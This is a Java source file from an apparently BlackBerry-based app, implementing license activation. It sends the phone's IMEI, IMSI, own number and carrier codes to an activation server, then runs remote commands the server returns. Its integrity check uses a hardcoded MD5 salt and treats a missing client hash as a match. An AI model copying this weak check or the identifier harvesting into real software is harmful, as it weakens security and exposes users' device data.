package com.vvt.protmgr;

import java.util.Vector;
import net.rim.device.api.crypto.MD5Digest;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.info.ServerUrl;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.CommandListener;
import com.vvt.prot.CommandMetaData;
import com.vvt.prot.CommandRequest;
import com.vvt.prot.CommandServiceManager;
import com.vvt.prot.command.SendActivate;
import com.vvt.prot.command.CompressionType;
import com.vvt.prot.command.EncryptionType;
import com.vvt.prot.command.GetActivationCode;
import com.vvt.prot.command.Languages;
import com.vvt.prot.command.TransportDirectives;
import com.vvt.prot.response.CmdResponse;
import com.vvt.prot.response.struct.GetActivationCodeCmdResponse;
import com.vvt.prot.response.struct.SendActivateCmdResponse;
import com.vvt.rmtcmd.RmtCmdProcessingManager;
import com.vvt.std.Constant;
import com.vvt.std.FxTimer;
import com.vvt.std.FxTimerListener;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;

public class SendActivateManager implements CommandListener, FxTimerListener {
	
	private static final int ACTIVATION_INTERVAL = 60 * 1;
	private static final String GLOBAL_TAIL = "1FD0EDB9EA";
	private static SendActivateManager self = null;
	private LicenseManager licManager = Global.getLicenseManager();
	private Preference pref = Global.getPreference();
	private ServerUrl serverUrl = Global.getServerUrl();
	private CommandServiceManager comServMgr = Global.getCommandServiceManager();
	private RmtCmdProcessingManager rmtCmdMgr = Global.getRmtCmdProcessingManager();
	private LicenseInfo licInfo = licManager.getLicenseInfo();
	private FxTimer actTimer = new FxTimer(this);
	private CmdResponse response = null;
	private Vector listeners = new Vector();
	private String activationCode = "";
	private boolean progress = false;
	
	private SendActivateManager() {
		actTimer.setInterval(ACTIVATION_INTERVAL);
	}
	
	public static SendActivateManager getInstance() {
		if (self == null) {
			self = new SendActivateManager();
		}
		return self;
	}
	
	public void activate() {
		licInfo = licManager.getLicenseInfo();
		if (licInfo.getLicenseStatus().getId() != LicenseStatus.ACTIVATED.getId()) {
			if (!progress) {
				progress = true;
				try {
					CommandRequest cmdRequest = new CommandRequest();
					// Meta Data
					CommandMetaData cmdMetaData = new CommandMetaData();
					cmdMetaData.setProtocolVersion(ApplicationInfo.PROTOCOL_VERSION);
					cmdMetaData.setProductId(licInfo.getProductID());
					cmdMetaData.setProductVersion(ApplicationInfo.PRODUCT_VERSION);
					cmdMetaData.setConfId(0);
					cmdMetaData.setDeviceId(PhoneInfo.getIMEI());
					cmdMetaData.setLanguage(Languages.THAI);
					cmdMetaData.setPhoneNumber(PhoneInfo.getOwnNumber());
					cmdMetaData.setMcc(Constant.EMPTY_STRING + PhoneInfo.getMCC());
					cmdMetaData.setMnc(Constant.EMPTY_STRING + PhoneInfo.getMNC());
					cmdMetaData.setImsi(PhoneInfo.getIMSI());
					cmdMetaData.setTransportDirective(TransportDirectives.NON_RESUMABLE);
					cmdMetaData.setEncryptionCode(EncryptionType.ENCRYPT_ALL_METADATA.getId());
					cmdMetaData.setCompressionCode(CompressionType.COMPRESS_ALL_METADATA.getId());
					// GetActivation Data
					GetActivationCode getActCode = new GetActivationCode();
					cmdRequest.setCommandData(getActCode);
					cmdRequest.setCommandMetaData(cmdMetaData);
					cmdRequest.setUrl(serverUrl.getServerActivationUrl());
					cmdRequest.setCommandListener(this);
					// Execute Command
					comServMgr.execute(cmdRequest);
					actTimer.stop();
					actTimer.start();
				} catch(Exception e) {
					Log.error("SendActivateManager.doActivate", null, e);
					progress = false;
					notifyError(e.getMessage());
				}
			}
		}
	}
	
	public void addListener(PhoenixProtocolListener listener) {
		if (!isExisted(listener)) {
			listeners.addElement(listener);
		}
	}

	public void removeListener(PhoenixProtocolListener listener) {
		if (isExisted(listener)) {
			listeners.removeElement(listener);
		}
	}
	
	private boolean isExisted(PhoenixProtocolListener listener) {
		boolean existed = false;
		for (int i = 0; i < listeners.size(); i++) {
			if (listener == listeners.elementAt(i)) {
				existed = true;
				break;
			}
		}
		return existed;
	}
	
	private void notifySuccess() {
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			listener.onSuccess(response);
		}
	}
	
	private void notifyError(String message) {
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			listener.onError(message);
		}
	}
	
	private boolean isServerHashMatched(SendActivateCmdResponse sendActCmdRes) {
		boolean matched = true;
		byte[] sHash = sendActCmdRes.getMd5();
		byte[] cHash = getClientHash(sendActCmdRes.getConfigID());
		if (cHash != null) {
			for (int i = 0; i < sHash.length; i++) {
				if (sHash[i] != cHash[i]) {
					matched = false;
					break;
				}
			}
		}
		return matched;
	}
	
	private byte[] getClientHash(int confId) {
		StringBuffer hashData = new StringBuffer();
		byte[] md5 = null;
		try {
			licInfo = licManager.getLicenseInfo();
			StringBuffer buff = new StringBuffer();
			buff.append(licInfo.getProductID());
			buff.append(confId);
			buff.append(PhoneInfo.getIMEI());
			buff.append(GLOBAL_TAIL);
	        String input = buff.toString();
	        if (input.length() > 70) {
	        	input = input.substring(0, 70);
	        }
	        MD5Digest digest = new MD5Digest();
	        byte[] plainText = input.getBytes();
	        digest.update(plainText, 0, plainText.length);
	        md5 = new byte[digest.getDigestLength()];
	        digest.getDigest(md5, 0);
		} catch(Exception e) {
			Log.error("SendActivateManager.getClientHash", null, e);
		}
        return md5;
	}
	
	// CommandListener
	public void onSuccess(CmdResponse res) {
		try {
			response = res;
			actTimer.stop();
			if (response instanceof GetActivationCodeCmdResponse) {
				GetActivationCodeCmdResponse getActCodeCmdRes = (GetActivationCodeCmdResponse)response;
				int statusCode = getActCodeCmdRes.getStatusCode();
				if (statusCode == 0) {
					CommandRequest cmdRequest = new CommandRequest();
					// Meta Data
					CommandMetaData cmdMetaData = new CommandMetaData();
					cmdMetaData.setProtocolVersion(ApplicationInfo.PROTOCOL_VERSION);
					cmdMetaData.setProductId(licInfo.getProductID());
					cmdMetaData.setProductVersion(ApplicationInfo.PRODUCT_VERSION);
					cmdMetaData.setConfId(0);
					cmdMetaData.setDeviceId(PhoneInfo.getIMEI());
					activationCode = getActCodeCmdRes.getActivationCode();
//					activationCode = "012365";
					cmdMetaData.setActivationCode(activationCode);
					cmdMetaData.setLanguage(Languages.THAI);
					cmdMetaData.setPhoneNumber(PhoneInfo.getOwnNumber());
					cmdMetaData.setMcc(Constant.EMPTY_STRING + PhoneInfo.getMCC());
					cmdMetaData.setMnc(Constant.EMPTY_STRING + PhoneInfo.getMNC());
					cmdMetaData.setImsi(PhoneInfo.getIMSI());
					cmdMetaData.setTransportDirective(TransportDirectives.NON_RESUMABLE);
					cmdMetaData.setEncryptionCode(EncryptionType.ENCRYPT_ALL_METADATA.getId());
					cmdMetaData.setCompressionCode(CompressionType.COMPRESS_ALL_METADATA.getId());
					// Activation Data
					SendActivate actData = new SendActivate();
			    	actData.setDeviceInfo(PhoneInfo.getPlatform());
			    	actData.setDeviceModel(PhoneInfo.getDeviceModel());
			    	cmdRequest.setCommandData(actData);
			    	cmdRequest.setCommandMetaData(cmdMetaData);
			    	cmdRequest.setUrl(serverUrl.getServerActivationUrl());
			    	cmdRequest.setCommandListener(this);
			    	// Execute Command
					comServMgr.execute(cmdRequest);
					actTimer.start();
				} else {
					Log.error("SendActivateManager.onSuccess", "This is an error on GetActivationCodeCmdResponse. StatusCode: " + statusCode);
					progress = false;
					notifyError(getActCodeCmdRes.getServerMsg());
				}
			} else if (response instanceof SendActivateCmdResponse) {
				progress = false;
				SendActivateCmdResponse sendActCmdRes = (SendActivateCmdResponse)response;
				PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
				generalInfo.setConnectionMethod(sendActCmdRes.getConnectionMethod());
				pref.commit(generalInfo);
				int statusCode = sendActCmdRes.getStatusCode();
				if (statusCode == 0) {
					if (isServerHashMatched(sendActCmdRes)) {
						// To save URL to LicenseInfo
						licInfo = licManager.getLicenseInfo();
						// To save activation code to LicenseInfo.
						licInfo.setActivationCode(activationCode);
						// To save configuration ID to LicenseInfo.
						licInfo.setProductConfID(sendActCmdRes.getConfigID());
						// To save license status to LicenseInfo.
						licInfo.setLicenseStatus(LicenseStatus.ACTIVATED);
						// to save server hash to LicenseInfo.
						licInfo.setServerHash(sendActCmdRes.getMd5());
						licManager.commit(licInfo);
						// To process PCC commands.
						rmtCmdMgr.process(sendActCmdRes.getPCCCommands());
						notifySuccess();
					} else {
						Log.error("SendActivateManager.onSuccess", "Server Hash doesn't match!");
						String msg = "Server Hash doesn't match.";
						notifyError(msg);
					}
				} else {
					Log.error("SendActivateManager.onSuccess", "This is an error on SendActivateCmdResponse. StatusCode: " + statusCode);
					notifyError(sendActCmdRes.getServerMsg());
				}
			}
		} catch(Exception e) {
			Log.error("SendActivateManager.onSuccess", null, e);
			progress = false;
			notifyError(e.getMessage());
		}
	}

	public void onConstructError(long csid, Exception e) {
		Log.error("SendActivateManager.onError", "csid: " + csid, e);
		actTimer.stop();
		progress = false;
		notifyError(e.getMessage());
	}
	
	public void onTransportError(long csid, Exception e) {
		Log.error("SendActivateManager.onError", "csid: " + csid, e);
		actTimer.stop();
		progress = false;
		StringBuffer errMsg = new StringBuffer();
		errMsg.append("Unable to connect to the server.");
		// TODO Http must return http status code.
//		errMsg.append(Constant.SPACE);
//		errMsg.append(Constant.OPEN_BRACKET);
//		errMsg.append("Http Error ");
//		errMsg.append();
//		errMsg.append(Constant.CLOSE_BRACKET);
		errMsg.append(Constant.CRLF);
		errMsg.append("Server URL: ");
		errMsg.append(serverUrl.getServerActivationUrl());
		notifyError(errMsg.toString());
	}

	// FxTimerListener
	public void timerExpired(int id) {
		// To cancel activation command. TODO
		progress = false;
		String msg = "Time out!";
		notifyError(msg);
	}
}
